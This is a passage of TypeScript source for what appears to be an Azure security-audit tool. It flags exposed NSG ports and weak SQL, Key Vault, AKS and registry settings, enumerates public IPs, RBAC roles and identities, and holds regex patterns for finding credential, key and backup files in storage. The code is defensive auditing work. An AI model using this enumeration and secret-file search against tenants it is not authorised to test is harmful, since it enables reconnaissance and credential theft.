        const databasePorts = [1433, 3306, 5432, 27017, 6379, 9042]; // SQL, MySQL, PostgreSQL, MongoDB, Redis, Cassandra
        const wildcardSources = ["*", "0.0.0.0/0", "Internet", "Any"];

        // Get NSGs
        let nsgs: any[] = [];
        if (nsgName && resourceGroup) {
          const nsg = await networkClient.networkSecurityGroups.get(resourceGroup, nsgName);
          nsgs = [nsg];
        } else if (resourceGroup) {
          for await (const nsg of networkClient.networkSecurityGroups.list(resourceGroup)) {
            nsgs.push(nsg);
          }
        } else {
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);
          for await (const resource of resourceClient.resources.list({ filter: "resourceType eq 'Microsoft.Network/networkSecurityGroups'" })) {
            if (resource.name && resource.id) {
              const rg = resource.id.split('/')[4];
              const nsg = await networkClient.networkSecurityGroups.get(rg, resource.name);
              nsgs.push(nsg);
            }
          }
        }

        for (const nsg of nsgs) {
          const nsgFindings: any[] = [];
          let riskScore = 0;

          // Analyze security rules
          const allRules = [
            ...(nsg.securityRules || []),
            ...(nsg.defaultSecurityRules || []),
          ];

          for (const rule of allRules) {
            if (rule.access === "Allow" && rule.direction === "Inbound") {
              const sourceAddress = rule.sourceAddressPrefix || rule.sourceAddressPrefixes?.join(',') || "";
              const destPort = rule.destinationPortRange || rule.destinationPortRanges?.join(',') || "";
              
              // Check for wildcard source
              const hasWildcardSource = wildcardSources.some(wild => 
                sourceAddress.includes(wild) || sourceAddress === ""
              );

              // Check for management ports
              const exposedMgmtPorts = managementPorts.filter(port => 
                destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
              );

              // Check for database ports
              const exposedDbPorts = databasePorts.filter(port => 
                destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
              );

              if (hasWildcardSource && exposedMgmtPorts.length > 0) {
                nsgFindings.push({
                  severity: "CRITICAL",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `Management port ${exposedMgmtPorts.join(', ')} exposed to Internet`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Restrict source to specific IPs or use Azure Bastion/VPN",
                  cve: "CWE-749: Exposed Dangerous Method or Function",
                  attackVector: exposedMgmtPorts.includes(3389) ? "RDP brute force" : exposedMgmtPorts.includes(22) ? "SSH brute force" : "Remote management exploitation",
                });
                riskScore += 50;
              }

              if (hasWildcardSource && exposedDbPorts.length > 0) {
                nsgFindings.push({
                  severity: "HIGH",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `Database port ${exposedDbPorts.join(', ')} exposed to Internet`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Use private endpoints or restrict to application subnet only",
                  cve: "CWE-668: Exposure of Resource to Wrong Sphere",
                  attackVector: "Direct database access, data exfiltration",
                });
                riskScore += 40;
              }

              if (hasWildcardSource && (destPort === "*" || destPort.includes("0-65535"))) {
                nsgFindings.push({
                  severity: "CRITICAL",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: "All ports exposed to Internet (wildcard rule)",
                  description: `Rule allows ALL ports from ${sourceAddress}`,
                  remediation: "Implement least privilege - allow only required ports",
                  cve: "CWE-284: Improper Access Control",
                  attackVector: "Full network exposure, service enumeration",
                });
                riskScore += 60;
              }

              if (hasWildcardSource && rule.priority && rule.priority < 1000) {
                nsgFindings.push({
                  severity: "MEDIUM",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `High-priority rule (${rule.priority}) allows Internet access`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Review rule necessity and consider increasing priority number",
                  cve: "CWE-284: Improper Access Control",
                });
                riskScore += 15;
              }
            }
          }

          nsgAnalysis.push({
            name: nsg.name,
            resourceGroup: nsg.id?.split('/')[4],
            location: nsg.location,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: nsgFindings,
            totalRules: allRules.length,
            allowInboundRules: allRules.filter(r => r.access === "Allow" && r.direction === "Inbound").length,
            attachedTo: {
              subnets: nsg.subnets?.length || 0,
              networkInterfaces: nsg.networkInterfaces?.length || 0,
            },
          });
        }

        // Sort by risk score
        nsgAnalysis.sort((a, b) => b.riskScore - a.riskScore);

        const criticalCount = nsgAnalysis.filter(n => n.riskLevel === "CRITICAL").length;
        const highCount = nsgAnalysis.filter(n => n.riskLevel === "HIGH").length;

        return {
          content: [
            {
              type: "text",
              text: `# NSG Security Analysis\n\n## Summary\n- Total NSGs: ${nsgAnalysis.length}\n- CRITICAL Risk: ${criticalCount}\n- HIGH Risk: ${highCount}\n- MEDIUM Risk: ${nsgAnalysis.filter(n => n.riskLevel === "MEDIUM").length}\n- LOW Risk: ${nsgAnalysis.filter(n => n.riskLevel === "LOW").length}\n\n## Detailed Findings\n\n${JSON.stringify(nsgAnalysis, null, 2)}`,
            },
          ],
        };
      }

      case "enumerate_public_ips": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const networkClient = new NetworkManagementClient(credential, subscriptionId);
        const publicIps: any[] = [];

        // Get public IPs
        let ips;
        if (resourceGroup) {
          ips = networkClient.publicIPAddresses.list(resourceGroup);
        } else {
          // List all public IPs across all resource groups
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);
          const ipList: any[] = [];
          for await (const resource of resourceClient.resources.list({ filter: "resourceType eq 'Microsoft.Network/publicIPAddresses'" })) {
            if (resource.name && resource.id) {
              const rg = resource.id.split('/')[4];
              const ip = await networkClient.publicIPAddresses.get(rg, resource.name);
              ipList.push(ip);
            }
          }
          ips = (async function* () {
            for (const ip of ipList) {
              yield ip;
            }
          })();
        }

        for await (const ip of ips) {
          const attachedTo = ip.ipConfiguration?.id 
            ? {
                resourceId: ip.ipConfiguration.id,
                resourceType: ip.ipConfiguration.id.split('/')[7], // Extract resource type
                resourceName: ip.ipConfiguration.id.split('/')[8],
              }
            : null;

          publicIps.push({
            name: ip.name,
            resourceGroup: ip.id?.split('/')[4],
            location: ip.location,
            ipAddress: ip.ipAddress || "Not allocated",
            allocationMethod: ip.publicIPAllocationMethod,
            dnsName: ip.dnsSettings?.fqdn || "None",
            domainNameLabel: ip.dnsSettings?.domainNameLabel || "None",
            version: ip.publicIPAddressVersion,
            sku: ip.sku?.name,
            attachedTo,
            provisioningState: ip.provisioningState,
            idleTimeoutInMinutes: ip.idleTimeoutInMinutes,
          });
        }

        return {
          content: [
            {
              type: "text",
              text: `# Public IP Addresses\n\n## Attack Surface Summary\n- Total Public IPs: ${publicIps.length}\n- Allocated: ${publicIps.filter(ip => ip.ipAddress !== "Not allocated").length}\n- With DNS Names: ${publicIps.filter(ip => ip.dnsName !== "None").length}\n- Attached to Resources: ${publicIps.filter(ip => ip.attachedTo).length}\n- Unattached (Orphaned): ${publicIps.filter(ip => !ip.attachedTo).length}\n\n## Public IPs\n\n${JSON.stringify(publicIps, null, 2)}`,
            },
          ],
        };
      }

      case "enumerate_rbac_assignments": {
        const { subscriptionId, scope } = request.params.arguments as {
          subscriptionId: string;
          scope?: string;
        };

        const authClient = new AuthorizationManagementClient(credential, subscriptionId);
        const assignments: any[] = [];
        const privilegedRoles = ["Owner", "Contributor", "User Access Administrator"];

        // Determine scope
        const targetScope = scope || `/subscriptions/${subscriptionId}`;

        // Get role assignments
        for await (const assignment of authClient.roleAssignments.listForScope(targetScope)) {
          // Get role definition details
          let roleName = "Unknown";
          let roleType = "Unknown";
          try {
            if (assignment.roleDefinitionId) {
              const roleDefId = assignment.roleDefinitionId.split('/').pop() || "";
              const roleDef = await authClient.roleDefinitions.getById(assignment.roleDefinitionId);
              roleName = roleDef.roleName || "Unknown";
              roleType = roleDef.roleType || "Unknown";
            }
          } catch (e) {
            // Role definition might not be accessible
          }

          const isPrivileged = privilegedRoles.includes(roleName);

          assignments.push({
            principalId: assignment.principalId,
            principalType: assignment.principalType,
            roleDefinitionId: assignment.roleDefinitionId,
            roleName,
            roleType,
            scope: assignment.scope,
            scopeLevel: assignment.scope?.includes('/resourceGroups/') 
              ? 'Resource Group' 
              : assignment.scope?.includes('/providers/') 
              ? 'Resource' 
              : 'Subscription',
            isPrivileged,
            createdOn: assignment.createdOn,
            createdBy: assignment.createdBy,
          });
        }

        // Sort by privileged roles first
        assignments.sort((a, b) => (b.isPrivileged ? 1 : 0) - (a.isPrivileged ? 1 : 0));

        const privilegedCount = assignments.filter(a => a.isPrivileged).length;
        const servicePrincipalCount = assignments.filter(a => a.principalType === "ServicePrincipal").length;
        const groupCount = assignments.filter(a => a.principalType === "Group").length;

        return {
          content: [
            {
              type: "text",
              text: `# RBAC Role Assignments\n\n## Summary\n- Total Assignments: ${assignments.length}\n- Privileged Roles (Owner/Contributor/UAA): ${privilegedCount}\n- Service Principals: ${servicePrincipalCount}\n- Groups: ${groupCount}\n- Users: ${assignments.filter(a => a.principalType === "User").length}\n\n## Scope: ${targetScope}\n\n## Role Assignments\n\n${JSON.stringify(assignments, null, 2)}`,
            },
          ],
        };
      }

      case "scan_sql_databases": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const sqlClient = new SqlManagementClient(credential, subscriptionId);
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const sqlServers: any[] = [];

        // Get SQL servers
        const servers = resourceGroup
          ? sqlClient.servers.listByResourceGroup(resourceGroup)
          : sqlClient.servers.list();

        for await (const server of servers) {
          const serverFindings: any[] = [];
          let riskScore = 0;
          const serverRg = server.id?.split('/')[4] || resourceGroup || "";
          const serverName = server.name || "";

          // Check firewall rules for allow-all
          const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, serverName);
          let hasAllowAll = false;
          for await (const rule of firewallRules) {
            if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
              serverFindings.push({
                severity: "CRITICAL",
                finding: `Firewall rule '${rule.name}' allows ALL Internet IPs`,
                description: "Rule: 0.0.0.0 - 255.255.255.255 allows unrestricted Internet access",
                remediation: "Remove allow-all rule and whitelist specific IPs/VNets only",
                cve: "CWE-284: Improper Access Control",
                attackVector: "Direct database access from Internet, brute force",
              });
              riskScore += 60;
              hasAllowAll = true;
            }
          }

          // Check Azure AD authentication
          if (!server.administrators || !server.administrators.azureADOnlyAuthentication) {
            serverFindings.push({
              severity: "HIGH",
              finding: "SQL authentication is enabled (not Azure AD-only)",
              description: "Server allows username/password authentication instead of Azure AD",
              remediation: "Enable Azure AD authentication and disable SQL logins",
              cve: "CWE-798: Use of Hard-coded Credentials",
              attackVector: "Password brute force, credential stuffing",
            });
            riskScore += 30;
          }

          // Check public network access
          if (server.publicNetworkAccess === "Enabled") {
            serverFindings.push({
              severity: "MEDIUM",
              finding: "Public network access is ENABLED",
              description: "Server is accessible from public Internet",
              remediation: "Use private endpoints and disable public network access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 15;
          }

          // Get databases for TDE check
          const databases = await sqlClient.databases.listByServer(serverRg, serverName);
          let unencryptedDbs = 0;
          for await (const db of databases) {
            if (db.name !== "master") {
              try {
                const tde = await sqlClient.transparentDataEncryptions.get(serverRg, serverName, db.name || "", "current");
                if (tde.state !== "Enabled") {
                  unencryptedDbs++;
                }
              } catch (e) {
                // TDE check failed
              }
            }
          }

          if (unencryptedDbs > 0) {
            serverFindings.push({
              severity: "CRITICAL",
              finding: `${unencryptedDbs} database(s) without TDE encryption`,
              description: "Transparent Data Encryption (TDE) is not enabled",
              remediation: "Enable TDE on all databases for encryption at rest",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          sqlServers.push({
            serverName: server.name,
            resourceGroup: serverRg,
            location: server.location,
            version: server.version,
            publicNetworkAccess: server.publicNetworkAccess,
            azureAdAuthOnly: server.administrators?.azureADOnlyAuthentication,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: serverFindings,
          });
        }

        sqlServers.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# SQL Database Security Analysis\n\n## Summary\n- Total SQL Servers: ${sqlServers.length}\n- CRITICAL Risk: ${sqlServers.filter(s => s.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${sqlServers.filter(s => s.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${sqlServers.filter(s => s.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(sqlServers, null, 2)}`,
            },
          ],
        };
      }

      case "analyze_key_vault_security": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const kvClient = new KeyVaultManagementClient(credential, subscriptionId);
        const keyVaults: any[] = [];

        const vaults = resourceGroup
          ? kvClient.vaults.listByResourceGroup(resourceGroup)
          : kvClient.vaults.listBySubscription();

        for await (const vault of vaults) {
          const vaultFindings: any[] = [];
          let riskScore = 0;

          // Check soft delete
          if (!vault.properties?.enableSoftDelete) {
            vaultFindings.push({
              severity: "CRITICAL",
              finding: "Soft delete is DISABLED",
              description: "Secrets/keys can be permanently deleted without recovery option",
              remediation: "Enable soft delete to allow 90-day recovery window",
              cve: "CWE-404: Improper Resource Shutdown or Release",
            });
            riskScore += 50;
          }

          // Check purge protection
          if (!vault.properties?.enablePurgeProtection) {
            vaultFindings.push({
              severity: "HIGH",
              finding: "Purge protection is DISABLED",
              description: "Deleted items can be immediately purged (no retention)",
              remediation: "Enable purge protection to prevent immediate deletion",
              cve: "CWE-404: Improper Resource Shutdown or Release",
            });
            riskScore += 30;
          }

          // Check public network access
          if (vault.properties?.publicNetworkAccess === "Enabled" || !vault.properties?.networkAcls) {
            vaultFindings.push({
              severity: "MEDIUM",
              finding: "Public network access is ENABLED",
              description: "Key Vault is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 15;
          }

          // Check RBAC vs Access Policies
          if (!vault.properties?.enableRbacAuthorization) {
            vaultFindings.push({
              severity: "LOW",
              finding: "Using Access Policies (not RBAC)",
              description: "Access Policies are less granular than Azure RBAC",
              remediation: "Migrate to Azure RBAC for better access control",
              cve: "CWE-284: Improper Access Control",
            });
            riskScore += 5;
          }

          keyVaults.push({
            name: vault.name,
            resourceGroup: vault.id?.split('/')[4],
            location: vault.location,
            softDeleteEnabled: vault.properties?.enableSoftDelete,
            purgeProtectionEnabled: vault.properties?.enablePurgeProtection,
            publicNetworkAccess: vault.properties?.publicNetworkAccess,
            rbacEnabled: vault.properties?.enableRbacAuthorization,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: vaultFindings,
          });
        }

        keyVaults.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# Key Vault Security Analysis\n\n## Summary\n- Total Key Vaults: ${keyVaults.length}\n- CRITICAL Risk: ${keyVaults.filter(k => k.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${keyVaults.filter(k => k.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${keyVaults.filter(k => k.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(keyVaults, null, 2)}`,
            },
          ],
        };
      }

      case "analyze_cosmos_db_security": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const cosmosClient = new CosmosDBManagementClient(credential, subscriptionId);
        const cosmosAccounts: any[] = [];

        const accounts = resourceGroup
          ? cosmosClient.databaseAccounts.listByResourceGroup(resourceGroup)
          : cosmosClient.databaseAccounts.list();

        for await (const account of accounts) {
          const accountFindings: any[] = [];
          let riskScore = 0;

          // Check public network access
          if (account.publicNetworkAccess === "Enabled") {
            accountFindings.push({
              severity: "HIGH",
              finding: "Public network access is ENABLED",
              description: "Cosmos DB is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 30;
          }

          // Check IP firewall rules
          if (!account.ipRules || account.ipRules.length === 0) {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No IP firewall rules configured",
              description: "Database is accessible from all IPs (if public access enabled)",
              remediation: "Configure IP firewall rules to whitelist specific IPs",
              cve: "CWE-923: Improper Restriction of Communication Channel",
            });
            riskScore += 15;
          }

          // Check virtual network rules
          if (!account.virtualNetworkRules || account.virtualNetworkRules.length === 0) {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No virtual network rules configured",
              description: "Not restricted to specific VNets",
              remediation: "Configure virtual network rules for VNet integration",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 10;
          }

          cosmosAccounts.push({
            name: account.name,
            resourceGroup: account.id?.split('/')[4],
            location: account.location,
            publicNetworkAccess: account.publicNetworkAccess,
            ipRulesCount: account.ipRules?.length || 0,
            vnetRulesCount: account.virtualNetworkRules?.length || 0,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: accountFindings,
          });
        }

        cosmosAccounts.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# Cosmos DB Security Analysis\n\n## Summary\n- Total Cosmos DB Accounts: ${cosmosAccounts.length}\n- HIGH Risk: ${cosmosAccounts.filter(c => c.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${cosmosAccounts.filter(c => c.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(cosmosAccounts, null, 2)}`,
            },
          ],
        };
      }

      case "analyze_vm_security": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const computeClient = new ComputeManagementClient(credential, subscriptionId);
        const vms: any[] = [];

        const virtualMachines = resourceGroup
          ? computeClient.virtualMachines.list(resourceGroup)
          : computeClient.virtualMachines.listAll();

        for await (const vm of virtualMachines) {
          const vmFindings: any[] = [];
          let riskScore = 0;
          const vmRg = vm.id?.split('/')[4] || resourceGroup || "";

          // Check OS disk encryption
          const osDiskEncrypted = vm.storageProfile?.osDisk?.encryptionSettings?.enabled || 
                                  vm.storageProfile?.osDisk?.managedDisk?.securityProfile?.securityEncryptionType;
          if (!osDiskEncrypted) {
            vmFindings.push({
              severity: "CRITICAL",
              finding: "OS disk encryption NOT enabled",
              description: "Operating system disk is not encrypted at rest",
              remediation: "Enable Azure Disk Encryption (BitLocker/dm-crypt)",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          // Check data disks encryption
          let unencryptedDataDisks = 0;
          if (vm.storageProfile?.dataDisks) {
            for (const disk of vm.storageProfile.dataDisks) {
              if (!disk.managedDisk?.securityProfile?.securityEncryptionType) {
                unencryptedDataDisks++;
              }
            }
          }
          if (unencryptedDataDisks > 0) {
            vmFindings.push({
              severity: "HIGH",
              finding: `${unencryptedDataDisks} data disk(s) not encrypted`,
              description: "Data disks are not encrypted at rest",
              remediation: "Enable Azure Disk Encryption on all data disks",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 30;
          }

          // Check for security extensions
          const hasDefender = vm.resources?.some(ext => 
            ext.name?.includes("MDE") || ext.name?.includes("Defender"));
          const hasMonitoring = vm.resources?.some(ext => 
            ext.name?.includes("AzureMonitor") || ext.name?.includes("OMS"));

          if (!hasDefender) {
            vmFindings.push({
              severity: "MEDIUM",
              finding: "Microsoft Defender extension not installed",
              description: "VM lacks endpoint protection",
              remediation: "Install Microsoft Defender for Endpoint extension",
              cve: "CWE-693: Protection Mechanism Failure",
            });
            riskScore += 15;
          }

          vms.push({
            name: vm.name,
            resourceGroup: vmRg,
            location: vm.location,
            osType: vm.storageProfile?.osDisk?.osType,
            osDiskEncrypted: !!osDiskEncrypted,
            unencryptedDataDisks,
            hasDefender,
            hasMonitoring,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: vmFindings,
          });
        }

        vms.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# Virtual Machine Security Analysis\n\n## Summary\n- Total VMs: ${vms.length}\n- CRITICAL Risk: ${vms.filter(v => v.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${vms.filter(v => v.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${vms.filter(v => v.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(vms, null, 2)}`,
            },
          ],
        };
      }

      case "scan_aks_clusters": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        const clusters: any[] = [];

        const aksClusters = resourceGroup
          ? containerClient.managedClusters.listByResourceGroup(resourceGroup)
          : containerClient.managedClusters.list();

        for await (const cluster of aksClusters) {
          const clusterFindings: any[] = [];
          let riskScore = 0;

          // Check RBAC
          if (!cluster.enableRbac) {
            clusterFindings.push({
              severity: "CRITICAL",
              finding: "Kubernetes RBAC is DISABLED",
              description: "No role-based access control for Kubernetes resources",
              remediation: "Enable RBAC for proper access control",
              cve: "CWE-284: Improper Access Control",
            });
            riskScore += 60;
          }

          // Check network policy
          if (!cluster.networkProfile?.networkPolicy) {
            clusterFindings.push({
              severity: "HIGH",
              finding: "Network policies NOT configured",
              description: "No network segmentation between pods",
              remediation: "Enable network policy (Azure CNI or Calico)",
              cve: "CWE-923: Improper Restriction of Communication Channel",
            });
            riskScore += 40;
          }

          // Check private cluster
          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
            clusterFindings.push({
              severity: "HIGH",
              finding: "NOT a private cluster",
              description: "Kubernetes API server has public endpoint",
              remediation: "Enable private cluster mode",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 35;
          }

          // Check Azure AD integration
          if (!cluster.aadProfile?.managed) {
            clusterFindings.push({
              severity: "MEDIUM",
              finding: "Azure AD integration NOT enabled",
              description: "Not using Azure AD for Kubernetes authentication",
              remediation: "Enable Azure AD managed integration",
              cve: "CWE-287: Improper Authentication",
            });
            riskScore += 15;
          }

          clusters.push({
            name: cluster.name,
            resourceGroup: cluster.id?.split('/')[4],
            location: cluster.location,
            kubernetesVersion: cluster.kubernetesVersion,
            rbacEnabled: cluster.enableRbac,
            networkPolicy: cluster.networkProfile?.networkPolicy,
            privateCluster: cluster.apiServerAccessProfile?.enablePrivateCluster,
            azureAdEnabled: cluster.aadProfile?.managed,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: clusterFindings,
          });
        }

        clusters.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# AKS Cluster Security Analysis\n\n## Summary\n- Total AKS Clusters: ${clusters.length}\n- CRITICAL Risk: ${clusters.filter(c => c.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${clusters.filter(c => c.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${clusters.filter(c => c.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(clusters, null, 2)}`,
            },
          ],
        };
      }

      case "scan_container_registries": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const acrClient = new ContainerRegistryManagementClient(credential, subscriptionId);
        const registries: any[] = [];

        const acrs = resourceGroup
          ? acrClient.registries.listByResourceGroup(resourceGroup)
          : acrClient.registries.list();

        for await (const acr of acrs) {
          const acrFindings: any[] = [];
          let riskScore = 0;

          // Check admin user
          if (acr.adminUserEnabled) {
            acrFindings.push({
              severity: "CRITICAL",
              finding: "Admin user is ENABLED",
              description: "Registry uses admin credentials instead of service principals",
              remediation: "Disable admin user and use Azure AD service principals",
              cve: "CWE-798: Use of Hard-coded Credentials",
            });
            riskScore += 50;
          }

          // Check public network access
          if (acr.publicNetworkAccess === "Enabled") {
            acrFindings.push({
              severity: "HIGH",
              finding: "Public network access is ENABLED",
              description: "Registry is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 30;
          }

          // Check network rule set
          if (!acr.networkRuleSet || acr.networkRuleSet.defaultAction === "Allow") {
            acrFindings.push({
              severity: "MEDIUM",
              finding: "No network restrictions configured",
              description: "Registry accessible from all networks",
              remediation: "Configure network rules to restrict access",
              cve: "CWE-923: Improper Restriction of Communication Channel",
            });
            riskScore += 15;
          }

          registries.push({
            name: acr.name,
            resourceGroup: acr.id?.split('/')[4],
            location: acr.location,
            sku: acr.sku?.name,
            adminUserEnabled: acr.adminUserEnabled,
            publicNetworkAccess: acr.publicNetworkAccess,
            networkRuleSetDefault: acr.networkRuleSet?.defaultAction,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: acrFindings,
          });
        }

        registries.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: `# Container Registry Security Analysis\n\n## Summary\n- Total ACRs: ${registries.length}\n- CRITICAL Risk: ${registries.filter(r => r.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${registries.filter(r => r.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${registries.filter(r => r.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(registries, null, 2)}`,
            },
          ],
        };
      }

      case "enumerate_service_principals": {
        const { subscriptionId } = request.params.arguments as {
          subscriptionId: string;
        };

        // Note: Service principals are tenant-level, requires Microsoft Graph API
        // This is a placeholder that shows the concept
        const message = `# Service Principal Enumeration\n\n[WARN] This tool requires Microsoft Graph API permissions.\n\nTo enumerate service principals, you need:\n1. Microsoft.Graph PowerShell module or Graph API access\n2. Application.Read.All or Directory.Read.All permissions\n\nExample PowerShell commands:\n\`\`\`powershell\nConnect-MgGraph -Scopes "Application.Read.All"\nGet-MgServicePrincipal -All\n\`\`\`\n\nThis feature will be enhanced in future versions with proper Graph API integration.`;

        return {
          content: [
            {
              type: "text",
              text: message,
            },
          ],
        };
      }

      case "enumerate_managed_identities": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const identities: any[] = [];

        // Find user-assigned managed identities
        const filter = "resourceType eq 'Microsoft.ManagedIdentity/userAssignedIdentities'";
        const resources = resourceGroup
          ? resourceClient.resources.listByResourceGroup(resourceGroup, { filter })
          : resourceClient.resources.list({ filter });

        for await (const identity of resources) {
          identities.push({
            name: identity.name,
            type: "User-Assigned",
            resourceGroup: identity.id?.split('/')[4],
            location: identity.location,
            id: identity.id,
          });
        }

        // Find resources with system-assigned identities
        const allResources = resourceGroup
          ? resourceClient.resources.listByResourceGroup(resourceGroup)
          : resourceClient.resources.list();

        const resourcesWithIdentity: any[] = [];
        for await (const resource of allResources) {
          // Check if resource has identity (basic check via resource properties)
          if (resource.identity) {
            resourcesWithIdentity.push({
              resourceName: resource.name,
              resourceType: resource.type,
              identityType: resource.identity.type,
              principalId: resource.identity.principalId,
              resourceGroup: resource.id?.split('/')[4],
            });
          }
        }

        return {
          content: [
            {
              type: "text",
              text: `# Managed Identity Enumeration\n\n## Summary\n- User-Assigned Identities: ${identities.length}\n- Resources with System-Assigned Identity: ${resourcesWithIdentity.length}\n\n## User-Assigned Identities\n\n${JSON.stringify(identities, null, 2)}\n\n## Resources with System-Assigned Identity\n\n${JSON.stringify(resourcesWithIdentity, null, 2)}`,
            },
          ],
        };
      }

      case "scan_storage_containers": {
        const { subscriptionId, resourceGroup, storageAccountName, maxBlobsPerContainer } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          storageAccountName?: string;
          maxBlobsPerContainer?: number;
        };

        const maxBlobs = maxBlobsPerContainer || 100;
        const storageClient = new StorageManagementClient(credential, subscriptionId);
        const scanResults: any[] = [];

        // Sensitive file patterns
        const sensitivePatterns = [
          { pattern: /\.(bak|backup)$/i, category: "Backup", severity: "CRITICAL" },
          { pattern: /\.(sql|db|mdf|ldf)$/i, category: "Database", severity: "CRITICAL" },
          { pattern: /\.(key|pem|pfx|p12|cer|ppk)$/i, category: "Certificate/Key", severity: "CRITICAL" },
          { pattern: /(web\.config|appsettings\.json|app\.config|\.env)$/i, category: "Configuration", severity: "CRITICAL" },
          { pattern: /(credentials|passwords|secrets)\.?/i, category: "Credentials", severity: "CRITICAL" },
          { pattern: /\.(kdbx|keystore|jks)$/i, category: "Keystore", severity: "HIGH" },
          { pattern: /(id_rsa|id_dsa|authorized_keys)$/i, category: "SSH Key", severity: "HIGH" },
          { pattern: /\.(zip|tar|gz|7z|rar)$/i, category: "Archive", severity: "MEDIUM" },
        ];

        // Get storage accounts to scan
        let accountsToScan: any[] = [];
        if (storageAccountName) {
          // Scan specific storage account
          const account = await storageClient.storageAccounts.getProperties(resourceGroup || "", storageAccountName);
          accountsToScan.push(account);
        } else {
          // Scan all storage accounts with public blob access
          const accounts = resourceGroup
            ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
            : storageClient.storageAccounts.list();

          for await (const account of accounts) {
            // Only scan accounts with potential public access
